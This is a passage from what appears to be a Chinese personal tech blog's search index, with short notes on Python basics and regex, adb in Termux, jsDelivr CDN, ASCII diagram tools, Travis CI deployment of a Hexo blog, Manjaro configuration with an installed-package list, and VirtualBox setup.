在定义参数时可以指定默认值 设定默认值的参数必须放在后面 12def fun(a,b=2): funbody 可变参数 可变参数必须放在最后一个 输入的数据会被包装成元组 1234def test(a,*n): # 可变的参数会被包装成元组，可以遍历它 for i in n : print(i)","link":"/Programming/Python/method.html"},{"title":"使用模块简化代码","text":"二次利用 引入模块会导入所有方法 只能引入当前目录的模块 12345678# 引入所有方法import moduleName# 使用方法moduleName.method1()# 引入所有方法from moduleName import *# 使用method1() 别名1import moduleName as new_name 引入模块的方法1from module import method1,method2 别名1from module import method1 as m1,method2","link":"/Programming/Python/mode.html"},{"title":"pythonic","text":"很python的东西 列表推导式1234567891011a = [1,2,3,4,5,6,7]b = [i**2 for i in a if i &gt;=4]c = {i**3 for i in a}print(b)print(c)&gt;&gt;&gt;[16, 25, 36, 49]&gt;&gt;&gt;{64, 1, 8, 343, 216, 27, 125} NoneNone不是空字符串，不是空列表，不是0，不是False 它也是一个对象，python里面一切都是对象 判空 123456if a: a != None a != ' ' a !=[] a != Falseif not a: 虽然None和False对应的分支是一样的，但他们的意义不一样，几乎所有对象都与bool值有转化关系 内置方法123456789class Test(): def __bool__(self): return False # 调用len() def __len__(self): return 0 # 判断类是否为False时主要看这两个内置函数# 共存时主要是__bool__# 在python2里面则是__nonzero__","link":"/Programming/Python/pythonic.html"},{"title":"Python正则","text":"python的正则 查找贪婪1234import re# 尽量满足6re.findall(&quot;[a-z]{3,6}&quot;,list) 非贪婪1234import re# 尽量满足3re.findall(&quot;[a-z]{3,6}?&quot;,list) .可以匹配除换行(\\n)的任意字符 I标志可以忽略大小写 S标志可以匹配任意字符 12re.findall(&quot;^test&quot;,list,re.I | re.S)# &quot;|&quot;不是或的意思，在这里表示与 查找并替换1234567#用法一re.sub(&quot;regular&quot;,&quot;substitute&quot;,string)#用法二def sub_fun(value): v = value.group() return &quot;[&quot;+v+&quot;]&quot;re.sub(&quot;regular&quot;,sub_fun,string) match,search123456789# 查找字符开头开头r = re.match(&quot;re&quot;,string)# 在字符里查找到就返回r2 = re.search(&quot;re&quot;,string)# 上面返回的都是Match对象# group返回查找到的值print(r.group())# span返回查找到的位置print(r2.span()) group查找到的字符串是一个大组，给group()传递参数可以取得指定的组，不传递参数默认是0（即所有内容），可同时传递多个参数如group(1,2)，匹配第一个组和第二个组 1234567b = &quot;&lt;h1&gt;Test&lt;/h1&gt;&quot;r3 = re.search(&quot;&lt;h1&gt;(.*)&lt;/h1&gt;&quot;,b)print(r3.group(1))# 或者r3 = re.findall(&quot;&lt;h1&gt;(.*)&lt;/h1&gt;&quot;,b)print(r3) groups()可直接得到里面的分组的数据而不需要传递参数，当然findall更方便","link":"/Programming/Python/regEXP.html"},{"title":"Termux+adb","text":"手机可以直接使用termux+adb调试手机, 无需电脑, 无需root 探究原理 我们知道手机通过USB连接电脑可以进行adb调试, 电脑需要准备adb-tools, adb是C/S架构, 打开USB调试后手机就是客户端, 电脑就是服务端, 电脑绑定在TCP端口5037, 手机也绑定在5037端口, 电脑会去扫描手机5555-5585的端口查找模拟器, 从而建立连接, 服务器可以连接多个设备 通过这个原理, 我想到了在Termux里安装adb-tools(项目地址), adb启动后成为服务端, 如下: 123* daemon not running. starting it now at tcp:5038 *#有点意外, 不是5037, 感觉是客户端在通信时占用5037造成的* daemon started successfully * 因为手机打开USB调试, 所以Termux会自动连接到模拟器, 从而实现无需电脑, 无需root, 手机+termux就可完成adb指令. so, adb可以做哪些有趣的事呢? adb可以做什么? 启动adb服务: adb start-server 关闭adb服务: adb kill-server 多设备记得使用-s指定 端口转发: adb forward tcp:8080 tcp:8090, 将本机的8080转发到其他设备的8090, adb reverse反向转发 交互式shell: adb shell 单命令式shell: adb shell [command] 查看可用指令: adb shell ls /system/bin 活动管理: adb shell am -h 包管理: adb shell pm -h 截图: adb shell screencap /sdcard/screen.png 录视频: adb shell screenrecord /sdcard/demo.mp4 值得注意的是一个android设备只能授权给一个客户端, 比如已经给termux授权过后又给电脑usb是没用的","link":"/TechnicalExperience/Android/Termux-adb.html"},{"title":"免费的CDN+Picgo","text":"CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科 通过CDN加快网站访问速度，提升用户体验 1.在github创建仓库，将访问的资源放上去并发布 2.通过jsDeliver引用资源 https://cdn.jsdelivr.net/gh/你的用户名/你的仓库名@发布的版本号或者分支名/文件路径 如下： 12&lt;img src=&quot;https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/20203f67c6b831ace4d1fe4d068600c2cfd6.jpg&quot; style=&quot;zoom:20%;&quot; /&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/943a485d76fbbcc50c15a49f5644cbb1.png&quot; style=&quot;zoom:33%;&quot; /&gt; 再配合PicGo，typora，简直不要太爽 注意picgo的代理和本机环境变量代理是冲突的 参考文章 免费CDN：jsDeliver+Github 使用方法 github page网站cdn优化加速","link":"/TechnicalExperience/Blog/CDN-jsDeliver-Github.html"},{"title":"asc字符图表、流程图，渲染代码图","text":"在绘制流程图等简单图形上面，打开图形绘制工具，画完保存，上传图床，复制链接（虽然typora简化了这些），但在看到某博客上面的一些使用asc，unicode字符做的图后，觉得很牛逼方便，于是便开始找工具制作。 先放几个例子 123456789+---+ +---+ +---+| A | --&gt; | C | --&gt; | D |+---+ +---+ +---+ | | v +---+ | E | +---+ 1234567 ................. v :+------+ +---------+ +---------+ +---------+ +--------------+| Task | --&gt; | Created | --&gt; | Audit 1 | --&gt; | Audit 2 | --&gt; | Execute Task |+------+ +---------+ +---------+ +---------+ +--------------+ ^ : ................................. 优先显而易见，兼容性强，体积小。实现这些图的方式有两种 手动绘制，怎么想就怎么画，不受限制。 写代码，使用工具渲染成其他格式（asc，html，avg）。代码复用性强 Graph easy这是一个工具，需要掌握一些语法进行渲染 安装在我的manjaro上，配置AUR源后，安装指令如下 1yaourt -S perl-graph-easy 使用graph-easy 文本即可，更多指令参见graph-easy --help 语法 简单语法 123456# 文本内容[hello]-&gt;[world]# 渲染图+-------+ +-------+| hello | --&gt; | world |+-------+ +-------+ 复杂语法mer 123456[ Client ]{rows:8;} -- (A) Authorizatoin Request --&gt; [ 1.Resource Owner ]{rows:2;}[ 1.Resource Owner ] -- (B) Authorizatoin Grant --&gt; [ Client ][ Client ] -- (C) Authorizatoin Request --&gt; [ 2.Authorizatoin Server ]{rows:2;}[ 2.Authorizatoin Server ] -- (D) Access Token --&gt; [ Client ][ Client ] -- (E) Access Token --&gt; [ 3.Resource Server ]{rows:2;}[ 3.Resource Server ] -- (F) Protected Resource --&gt; [ Client ] 渲染后 123456789101112131415161718+--------+ (A) Authorizatoin Request +------------------------+| | ---------------------------&gt; | || | | 1.Resource Owner || | (B) Authorizatoin Grant | || | &lt;--------------------------- | || | +------------------------+| | (C) Authorizatoin Request +------------------------+| | ---------------------------&gt; | || Client | | 2.Authorizatoin Server || | (D) Access Token | || | &lt;--------------------------- | || | +------------------------+| | (E) Access Token +------------------------+| | ---------------------------&gt; | || | | 3.Resource Server || | (F) Protected Resource | || | &lt;--------------------------- | |+--------+ +------------------------+ 更多的语法参见 官网 部分翻译 mermaidmermermaid把一些流程图片等简单图片简化成代码，我以前都是用工具制作成图片在上传图床使用，使用mermaid很明显是一个高效率的方法，但需要学习一点它的语法，typorta支持渲染，如果需要在博客上渲染的化需要安装hexo-filter-mermaid-diagrams插件，我的博客还不能渲染，但typora可以导出html gantt dateFormat MM-DD title 软件开发甘特图 section 设计 需求: done,des1, 01-06,01-08 原型: active, des2, 01-09, 3d UI设计: des3, after des2, 5d 未来任务: des4, after des3, 5d section 开发 学习准备理解需求: crit, done, 01-06,24h 设计框架: crit, done, after des2, 2d 开发: crit, active, 3d 未来任务: crit, 5d 休息: 2d section 测试 功能测试: active, a1, after des3, 3d 压力测试: after a1 , 20h 测试报告: 48h graph TB subgraph one a1-->a2 end subgraph two b1-->b2 end subgraph three c1-->c2 end c1-->a2 Drawit手绘工具，这是一个vim插件，下载安装 使用\\di 进入drawit模式 \\ds 退出 功能 按键和指令 作用 left 向左绘制 right 向右绘制 up 向上绘制 down 向下绘制 h 左移动 j 下移动 k 上 l 右 space 橡皮擦模式 PD 右下绘制 PU 左下绘制 HOME 左上绘制 END 右上绘制 v,&lt;,&gt;,^ 四个箭头 \\v,\\&lt;,\\&gt;,^ 四个粗箭头 crtl+v/鼠标拖动 进入visible模式 \\l 在visible模式下，对选择块画线 \\a 呈上，画带箭头的线 \\b 对选择块画盒子 \\e 对选择块画椭圆 \\f 字符 以字符填充光标区域 \\r 字符 以字符填充选择块填充 下面是我乱画的，随意参考 1234567891011121314151617181920212223242526┌─────────┐└─────────┘ | ------------_-_ | \\ / +--------+ X | | | +------+ / \\ | | |-----| |\\ X \\| +--------+ | | \\ / \\ | +------+ \\ / \\ /| \\ / X | \\ X X / X | \\ / \\ / \\ / / | --------------------------&gt; X X X / | _ _ | \\ / | +---+ _'_ | +------------+ | | \\ / | |333333333333| | | ' _|_ |333333333333| | | \\ / |333333333333| | ^-|----------+------___------ |33333333333| | \\____ +------------+ | \\___ X /---|&gt;---- \\____ X \\ / / \\____ \\ X / \\___ \\ / \\____ X \\__ 参考文章如何制作纯 ASCII 文本流程图 python-tabulate这是一个python的库，用来制作表格，markdown里估计用不到了，但若想将程序的数组输出表格可以用到它 安装1pip install tabulate 使用支持传递的数据类型 list of lists or another iterable of iterables list or another iterable of dicts (keys as columns) dict of iterables (keys as columns) two-dimensional NumPy array NumPy record arrays (names as columns) pandas.DataFrame 我使用列表做示例 123from tabulate import tabulatea = [['a1','a2'],['b1','b2'],['c1','c2']] 普通的打印 123456&gt;&gt;&gt; print(tabulate(a))-- --a1 a2b1 b2c1 c2-- -- 可选参数headers，指定表格头部 传递指定表头数据 firstrow代表第一行为头部 keys使用索引 12345&gt;&gt;&gt; print(tabulate(a,headers='firstrow'))a1 a2---- ----b1 b2c1 c2 可选参数showindex，代表行索引 True False 123456&gt;&gt;&gt; print(tabulate.tabulate(a,showindex=True))- -- --0 a1 a21 b1 b22 c1 c2- -- -- 表格样式 plain 1234&gt;&gt;&gt; print(tabulate.tabulate(a,tablefmt='plain'))a1 a2b1 b2c1 c2 simple（默认） 12345-- --a1 a2b1 b2c1 c2-- -- pretty 12345+----+----+| a1 | a2 || b1 | b2 || c1 | c2 |+----+----+ pipe 1234|:---|:---|| a1 | a2 || b1 | b2 || c1 | c2 | github 1234|----|----|| a1 | a2 || b1 | b2 || c1 | c2 | grid 1234567+----+----+| a1 | a2 |+----+----+| b1 | b2 |+----+----+| c1 | c2 |+----+----+ fancy_grid 1234567╒════╤════╕│ a1 │ a2 │├────┼────┤│ b1 │ b2 │├────┼────┤│ c1 │ c2 │╘════╧════╛ 更多方法参考官方](https://pypi.org/project/tabulate/) 总结Graph-easy毕竟有点老，好久没更新了，为了画asc图掌握语法实在有点费力，没什么特殊需求不建议使用，绘制普通asc流程图我还是建议使用手绘，asc图表建议使用python库，若想绘制精致一点的流程图，时序图，干特图我选择mermaid。","link":"/TechnicalExperience/Blog/asc-table.html"},{"title":"Gitalk和Travis自动化","text":"为了更好的体验及更加方便的写博客 Gitalk因为主题自带gitalk插件，虽然版本有点老，所以只需申请Github Application即可 点击申请 得到clientID和client Secret填入主题的配置文件即可 然后推送到仓库，使用管理员账户登录这个网页即可创建issue 偶尔会出现Error：network error的问题，原因不明 参考为博客添加 Gitalk 评论插件 因为文章过多，一个一个取创建太麻烦，于是我找到了自动初始化的方法， 先生成站点地图 参考hexo(3)-生成sitemap站点地图 然后我又参考了 nodejs版本的Gitalk/Gitment评论自动初始化 自动初始化 Gitalk 和 Gitment 评论 一个js脚本，一个ruby脚本 但我用起来都不理想… 接着我看到了这个自动初始化gitalk/gitment评论，然后我看到了hexo博客push到github的后自动部署到github pages Travis-CITravis CI 是在软件开发领域中的一个在线的，分布式的持续集成服务，用来构建及测试在GitHub托管的代码。 由于今天Travis在维护，我也不知道我的部署到底有没有成功 登录官方网站与github帐号绑定后选择追踪项目，然后在项目根目录添加.travis.yml文件 因为我的想法是推送博客源码到hexo分支，然后自动部署master分支，贴出我的源码仅供参考 123456789101112131415161718language: node_jsnode_js: stablebranches: only: - hexoinstall: - npm install hexoscript: - hexo clean - hexo gafter_script: - cd ./public - git init - git config user.name &quot;manuev&quot; - git config user.email &quot;manu2001@163.com&quot; - git add . - git commit -m &quot;Travis CI Auto Builder at $(date +'%Y-%m-%d')&quot; - git push --force --quiet &quot;https://${ACCESS_TOKEN}@github.com/shepherdev/shepherdev.github.io.git&quot; master:master 推送后可以在travis官网查看实时部署动态，值得一提的是配置的步骤有一行代码报错就会部署失败 为了搞定Travis我参考了很多文章，都列出了吧，我感觉我还用的到 Travis CI官网 阮一峰的持续集成服务 Travis CI 教程 Github 使用 Travis CI 实现 Hexo 博客自动部署 使用 Travis CI 实现 Hexo 博客自动部署 使用Travis CI自动部署Hexo博客 因为不知道是维护的缘故还是我操作的缘故导致我一直没弄成功","link":"/TechnicalExperience/Blog/gitalk-Travis-CI.html"},{"title":"配置amazing主题","text":"发现了hexo上面的有一个很美的主题模板–icraus 我使用的是remove修改的版本 照着readme文件进行简单配置可以了 使用LaTeX语法主题的_config.yml配置 12plugins: mathjax: true 哪篇文章需要使用，就在m头部加上 1mathJax: true 添加encrypt插件在博客下打开终端，输入 1npm install --save hexo-blog-encrypt 博客_config.yml加上全局配置 12345encrypt: abstract: 有东西被加密了, 请输入密码查看. message: 您好, 这里需要密码. wrong_pass_message: 抱歉, 这个密码看着不太对, 请再试试. wrong_hash_message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容. 也可以在文章开头单独设置 SEO优化打开_config.yml配置文件，找到permalink 12# 改为下面这样permalink: :title.html","link":"/TechnicalExperience/Blog/theme-amzing-config.html"},{"title":"优化Manjaro","text":"为了让系统完美的契合自己，查了很多资料来完善它，写这篇文章记录下过程 sh首先就是将bash改成了zsh，使用主题ys，高亮插件和语法补全插件 参考文章oh-my-zsh,让你的终端从未这么爽过 mail在使用crond时，总感觉manjaro的mail有点问题，重新弄了一下 下载s-nail、sendmail、procmail、m4 在使用过程中发现sendmail很卡顿，主要原因是WARNING: local host name (MY) is not qualified; see cf/README: WHO AM I? 查了下将/etc/hosts里的 1127.0.0.1 localhost 改为了（MY是我的主机名） 1127.0.0.1 localhost.localdomain localhost MY 这样启动和运行就快多了，原理就是sendmail在解析我的主机名，而我的主机名MY根本就找不到，所以浪费时间，在hosts里把主机名作为别名添加到IP后面即可 参考文章 archwiki sendmail linux sendmail 启动慢及mail 无法发送的问题一例 rsyslog因为是看鸟哥的书学的linux，对rsyslog日志管理比较熟悉，而manjaro自带的是syslog，于是查wiki安装了rsyslog 首先卸载syslog-ng，以免冲突，然后下载rsyslog，注意它在AUR源里 为了从systemd提取日志 需要加载imjournal模块，在/etc/rsyslog.conf添加 1$ ModLoad imjournal 然后转发journal，在/etc/systemd/jouranld.conf修改 1ForwordToSyslog = yes 重启rsyslog服务即可 参考文章 Archwiki-rsyslog 记住要设置开机自启 下面是本机上的程序(不包括依赖) program &gt;folded123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397acpi 1.7-3acpid 2.0.32-1aircrack-ng 1.6-2alsa-firmware 1.2.1-2alsa-utils 1.2.2-1android-tools 29.0.6-1android-udev 20200410-1apparmor 2.13.4-4archlinuxcn-keyring 20200226-1ark 20.04.0-1autoconf 2.69-7automake 1.16.2-1avahi 0.8+15+ge8a3dd0-1b43-fwcutter 019-3baidunetdisk-bin 3.0.1.2-7bash-completion 2.10-1bauh 0.9.0-1bind-tools 9.16.2-2binutils 2.34-2.1bison 3.5.4-1bluedevil 1:5.18.5-1bluez-utils 5.54-2btrfs-progs 5.6-1bzip2 1.0.8-3coreutils 8.32-1cpupower 5.6-1crda 4.14-3cronie 1.5.5-1cryptsetup 2.3.2-1cups 2.3.3-1cups-pdf 3.0.1-5cups-pk-helper 0.2.6-3deepin-wine-wechat 2.8.0.121-1deepin.com.qq.office 2.0.0_4-2device-mapper 2.02.187-2dhclient 4.4.2-2dhcpcd 9.0.2-1dia 0.97.3-5diffutils 3.7-3dkms 2.8.1-2dmidecode 3.2-1dmraid 1.0.0.rc16.3-12dnsmasq 2.81-4dolphin 20.04.0-1dolphin-plugins 20.04.0-1dosfstools 4.1-3e2fsprogs 1.45.6-2eclipse-java 4.15-1ecryptfs-utils 111-3efibootmgr 17-1exfat-utils 1.3.0-1f2fs-tools 1.13.0-1fakeroot 1.24-2fcitx 4.2.9.7-3fcitx-configtool 0.4.10-3fcitx-googlepinyin 0.1.6-6fcitx-qt5 1.2.4-4ffmpeg 1:4.2.2-6ffmpegthumbs 20.04.0-1file 5.38-3filelight 20.04.0-1filesystem 2019.10-4findutils 4.7.0-2firefox 76.0.1-1flatpak 1.7.2-1flex 2.6.4-3fwupd 1.4.0-1gawk 5.1.0-1gcc 9.3.0-1gcc-libs 9.3.0-1gettext 0.20.2-1ghostscript 9.52-1gimp 2.10.18-6git 2.26.2-1gitg 1:3.32.1+17+gb4c8155f-1glibc 2.31-2gnome-icon-theme 3.12.0-5gnome-settings-daemon 3.36.1-1gnome-themes-extra 3.28-1google-chrome 81.0.4044.138-1grep 3.4-1grub 2.04-10grub-theme-manjaro 18.1-1gsfonts 20180524-2gst-libav 1.16.2-1gst-plugins-bad 1.16.2-9gst-plugins-base 1.16.2-1gst-plugins-good 1.16.2-3gst-plugins-ugly 1.16.2-3gtk-theme-breath 5.9.0-1gtk3 1:3.24.20-1gvfs 1.44.1-3gvfs-afc 1.44.1-3gvfs-gphoto2 1.44.1-3gvfs-mtp 1.44.1-3gvfs-nfs 1.44.1-3gvfs-smb 1.44.1-3gwenview 20.04.0-2gzip 1.10-3haveged 1.9.8-1hostapd 2.9-3hplip 1:3.20.3-2htop 2.2.0-3illyria-wallpaper 1.4-1imagewriter 1.10.1420800585.134a9b3-4inetutils 1.9.4-8inkscape 1.0-3intel-ucode 20191115-3intellij-idea-community-edition 2:2020.1.1-1inxi 3.0.37-1iproute2 5.6.0-1iptables 1:1.8.4-1.1iputils 20190709-2ipw2100-fw 1.3-10ipw2200-fw 3.1-8jdk 14.0.1-1jfsutils 1.1.15-7kaccounts-providers 20.04.0-1kamera 20.04.0-1kate 20.04.0-1kcalc 20.04.0-1kde-gtk-config 5.18.5-1kde-servicemenus-rootactions 2.9.1-1kdeconnect 20.04.0-1kdegraphics-thumbnailers 20.04.0-1kdenetwork-filesharing 20.04.0-1kdenlive 20.04.0-1kdeplasma-addons 5.18.5-1keditbookmarks 20.04.0-1kernel-alive 0.5-1kfind 20.04.0-1kgamma5 5.18.5-1kget 20.04.0-1khelpcenter 20.04.0-1kimageformats 5.69.0-1kinfocenter 5.18.5-1kio-extras 20.04.0-1kmenuedit 5.18.5-1konsole 20.04.0-1konversation 1.7.5-3kscreen 5.18.5-1kscreenlocker 5.18.5-1ksshaskpass 5.18.5-1ksysguard 5.18.5-1ksystemlog 20.04.0-1kwallet-pam 5.18.5-1kwalletmanager 20.04.0-1kwayland-integration 5.18.5-1kwin 5.18.5-1kwrited 5.18.5-1latte-dock 0.9.11-1less 551-3lib32-flex 2.6.4-2lib32-libcanberra 0.30+2+gc0620e4-3lib32-libcanberra-pulse 0.30+2+gc0620e4-3lib32-libva-intel-driver 2.4.0-1lib32-libva-mesa-driver 20.0.6-2lib32-libva-vdpau-driver 0.7.4-6lib32-mesa-demos 8.4.0-1lib32-mesa-vdpau 20.0.6-2lib32-vulkan-intel 20.0.6-2lib32-vulkan-radeon 20.0.6-2libcanberra 0.30+2+gc0620e4-3libcanberra-gstreamer 0.30+2+gc0620e4-3libcanberra-pulse 0.30+2+gc0620e4-3libdvdcss 1.4.2-2libestr 0.1.11-1libfastjson 0.99.8-2libktorrent 2.1.1-1liblogging 1.0.6-3librelp 1.4.0-1libtool 2.4.6+42+gb88cebd5-12libva-intel-driver 2.4.0-1libva-mesa-driver 20.0.6-2libva-vdpau-driver 0.7.4-4licenses 20200427-1linux-firmware 20200424.r1632.b2cad6a-1linux-lts-headers 1:5.4-1linux-rt-lts-manjaro 5.4-1linux-rt-lts-manjaro-headers 5.4-1linux54 5.4.39-1linux54-rt 5.4.28_rt19-1linux54-rt-headers 5.4.28_rt19-1logrotate 3.16.0-1lsb-release 1.4-13lvm2 2.02.187-2m4 1.4.18-3make 4.3-3man-db 2.9.1-2man-pages 5.06-2manjaro-alsa 20200126-1manjaro-application-utility 1.3.2-2manjaro-bluetooth 20200126-1manjaro-browser-settings 20200124-1manjaro-documentation-en 20181009-1manjaro-firmware 20160419-1manjaro-hello 0.6.5-11manjaro-hotfixes 2018.08-6manjaro-kde-settings 20200430-1manjaro-pulse 20200126-1manjaro-release 20.0.1-1manjaro-settings-manager-kcm 0.5.6-8manjaro-settings-manager-knotifier 0.5.6-8manjaro-system 20200427-1manjaro-wallpapers-18.0 1.4-3mdadm 4.1-2memtest86+ 5.01-3mesa-demos 8.4.0-4mesa-vdpau 20.0.6-2mhwd 0.6.4-2mhwd-db 0.6.4-10milou 5.18.5-1mindmaster-cn 7.2-1mkinitcpio-openswap 0.1.0-3mobile-broadband-provider-info 20190618-1modemmanager 1.12.10-1mtpfs 1.1-3mypaint 1.2.1-12nano 4.9.2-1net-tools 1.60.20181103git-2netctl 1.23-1netease-cloud-music 1.2.1-1netease-cloud-music-gtk 1.1.1-1networkmanager 1.24.0-1networkmanager-openconnect 1.2.6-1networkmanager-openvpn 1.8.12-1networkmanager-pptp 1.2.9dev+10+gb41b0d0-1networkmanager-vpnc 1.2.7dev+20+gdca3aea-1nfs-utils 2.4.3-2noto-fonts 20190926-4noto-fonts-cjk 20190409-1noto-fonts-emoji 20191016-6nss-mdns 0.14.1-2ntfs-3g 2017.3.23-4ntp 4.2.8.p14-1numlockx 1.2-5obs-studio 25.0.8-1okular 20.04.0-1openresolv 3.10.0-1openssh 8.2p1-3os-prober 1.77-1oxygen 5.18.5-1oxygen-icons 1:5.69.0-1p7zip 16.02-5pacman 5.2.1-4pamac-cli 9.5.0-1pamac-gtk 9.5.0-1pamac-snap-plugin 9.5.0-1pamac-tray-appindicator 9.5.0-1partitionmanager3 3.3.1-1patch 2.7.6-8patchutils 0.3.4-3pavucontrol 1:4.0-1pciutils 3.6.4-1peek 1.5.1-2perl 5.30.2-1perl-file-mimeinfo 0.29-2phonon-qt5-gstreamer 4.10.0-1pinta 1.6-4pkgconf 1.6.3-4plasma-desktop 5.18.5-1plasma-nm 5.18.5-1plasma-pa 5.18.5-1plasma-workspace 5.18.5-1plasma-workspace-wallpapers 5.18.5-1plasma5-themes-breath 0.4.0-2poppler-data 0.4.9-2powerdevil 5.18.5-1powertop 2.12-1print-manager 20.04.0-1procmail 3.22-10procps-ng 3.3.16-1psmisc 23.3-2pulseaudio-ctl 1.67-1pulseaudio-zeroconf 13.0-3pycharm-community-edition 2020.1.1-1pygtk 2.24.0-13python-lxml 4.5.0-1python-pillow 6.2.1-1python-pip 20.0.2-1python-pygame 1.9.6-3python-pyqt5 5.14.2-1python-pysmbc 1.0.20-1python-pyxdg 0.26-6python-reportlab 3.5.42-1python-xlib 0.27-1python2-pbkdf2 1.3-1python2-pyric 0.1.6.3-1qq-linux 2.0.0_b2_1082-1qt5-imageformats 5.14.2-1qt5-virtualkeyboard 5.14.2-1quadrapassel 3.36.02-1rar 5.9.0-1reiserfsprogs 3.6.27-3roguehostapd-git 1.0.r45.g381b373-1rsync 3.1.3-3rsyslog 8.2004.0-1ruby 2.7.1-2s-nail 14.9.19-1samba 4.12.2-3scapy 2.4.3-2scrcpy 1.13-1screenfetch 3.9.1-1sddm 0.18.1-2sddm-breath-theme 0.4.0-2sddm-kcm 5.18.5-1sed 4.8-1sendmail 8.15.2-9shadow 4.8.1-1simplescreenrecorder 0.4.1-1skanlite 2.1.0.1-2sl 5.02-5snapd 2.44.5-1snapd-glib 1.54-1spectacle 20.04.0-1spectre-meltdown-checker 0.43-1splix 2.0.0-14sshfs 3.7.0-1steam-manjaro 1.0.0.61-7subversion 1.13.0-2sudo 1.8.31.p1-1sysfsutils 2.1.0-11system-config-printer 1.5.12+33+g23b454ef-1systemd-fsck-silent 239-1systemd-kcm 1.2.1-5systemd-sysvcompat 245.5-2systemsettings 5.18.5-1tar 1.32-3terminus-font 4.48-1tesseract 4.1.1-2texinfo 6.7-3thunderbird 68.8.0-1timeshift 20.03.r0.gcecd294-1tlp 1.3.1-2traceroute 2.1.0-5ttf-bitstream-vera 1.10-12ttf-droid 20121017-7.2ttf-inconsolata 1:3.000-2ttf-indic-otf 0.2-9ttf-liberation 2.1.0-1typora 0.9.86-1udiskie 2.1.1-1udisks2 2.8.4-2unarchiver 1.10.1-10usb_modeswitch 2.6.0-2usbutils 012-2user-manager 5.18.5-1util-linux 2.35.1-2.1vde2 2.3.2-13vi 1:070224-4vim 8.2.0717-2virtualbox 6.1.6-1virtualbox-ext-vnc 6.1.6-1virtualbox-guest-iso 6.1.6-1virtualbox-host-dkms 6.1.6-1virtualbox-sdk 6.1.6-1visual-studio-code-bin 1.45.1-1vlc 3.0.10-1vokoscreen-git 3.0.2.13.g9e58d6fb-1vulkan-intel 20.0.6-2vulkan-radeon 20.0.6-2wacom-utility 1.21-6wallpapers-2018 1.2-1wallpapers-juhraya 1.1-2wget 1.20.3-3which 2.21-5whois 5.5.6-1wireshark-qt 3.2.3-1wpa_supplicant 2:2.9-7wps-office-cn 11.1.0.9505-1wps-office-mui-zh-cn 11.1.0.9505-1xclip 0.13-2xdg-desktop-portal 1.7.2-1xdg-desktop-portal-kde 5.18.5-1xdg-su 1.2.3-1xdg-user-dirs 0.17-2xdg-utils 1.1.3+19+g9816ebb-1xf86-input-elographics 1.4.2-1xf86-input-evdev 2.10.6-1xf86-input-libinput 0.29.0-2xf86-input-void 1.4.1-4xf86-video-amdgpu 19.1.0-1xf86-video-ati 1:19.1.0-1xf86-video-intel 1:2.99.917+906+g846b53da-1xf86-video-nouveau 1.0.16-1xfsprogs 5.6.0-2xmind 3.7.9+8update9-1xorg-server 1.20.8-2xorg-twm 1.0.10-2xorg-xinit 1.4.1-1xorg-xkill 1.0.5-2yakuake 20.04.0-1yaourt 1.9-1yay 9.4.7-2youdao-dict 1.1.0-2zeal 1:0.6.1-1zsh 5.8-1 ventoy是一个镜像工具，可以将u盘的iso文件直接读取使用 mindmaster，xmind制作脑图的工具 Packet tracer用户登录闪退问题安装ttf-ms-fonts解决","link":"/TechnicalExperience/Linux/Manjaro-optimization.html"},{"title":"安装Manjaro疑难杂症","text":"装Manjaro时遇到的一些问题 1.在分区时将/usr独立，导致开机启动提示/sbin/init does not exist，并且啥也不能输入，原因我还没弄懂 2.进入系统后，将亮度条拉到最低，最想不到的事出现了，黑屏（纯黑），我的电脑屏幕可不是A屏，我没想到这kde的开发者怎么坑，竟然把亮度最低弄到了黑屏QWQ，废了半天，终于找到了解决办法： 查了下官方文档，只能得到配置文件到家目录下的.config里 没多余的linux系统，我找到了我的U盘，插上进入shell挂载我的家目录进行除错 最开始我是在.config找kde开头的文件，emm只有两个，看了下没一个像亮度的 然后我仔细想了想，最开始用manjaro的时候，我一直没找到亮度条，原因就是它并不在显示里面，而是在电源管理里面，于是我换目标，找power开头的文件 我找到了里面的powermanagementprofilesrc(乖乖，名字真长)，看到brightness control，那一刻我感觉我看了上帝，看到设置值，果然是0，我改成10重启，终于看到了我熟悉的桌面QAQ","link":"/TechnicalExperience/Linux/Manjaro-problems.html"},{"title":"在Manjaro上使用virtualbox","text":"安装问题使用pacman -S virtualbox后，打开创建新的新的虚拟机出现错误 1234567WARNING: The vboxdrv kernel module is not loaded. Either there is no module available for the current kernel (5.4.35-1-MANJARO) or it failed to load. Please recompile the kernel module and install it by sudo /sbin/vboxconfig You will not be able to start VMs until this problem is fixed. 说模块没有加载成功，需要使用sudo /sbin/vboxconfig修复，但实际上没有这个文件 参考在 Arch 里安装 VirtualBox这篇文章后，我安装了两个模块 virtualbox-host-dkms(需要看自己的内核版本安装, 比如我的是linux58-virtualbox-host-modules) linux-lts-headers 查看模块加载情况 1234# manu @ MY in ~ [14:04:17] C:1$ sudo vboxreload Unloading modules: Loading modules: vboxnetadp vboxnetflt vboxdrv 然后重新打开virtualbox，运行正常 代理问题网络使用NAT时, 虚拟机的网关其实就是物理机的localhost, 所以只需要在代理处填写网关ip:物理机代理端口就行了 其实我考虑过端口转发, vbox设置的端口转发好像只支持从物理机转发到虚拟机 在host-only下, win7的防火墙会挡住来自主机的访问","link":"/TechnicalExperience/Linux/Manjaro-virtualbox-install.html"},{"title":"Linux秘钥导入失败解决方法","text":"当我使用yay安装软件时, 提示yay gpg: 从公钥服务器接收失败：Server indicated a failure, 记录下我的解决方法 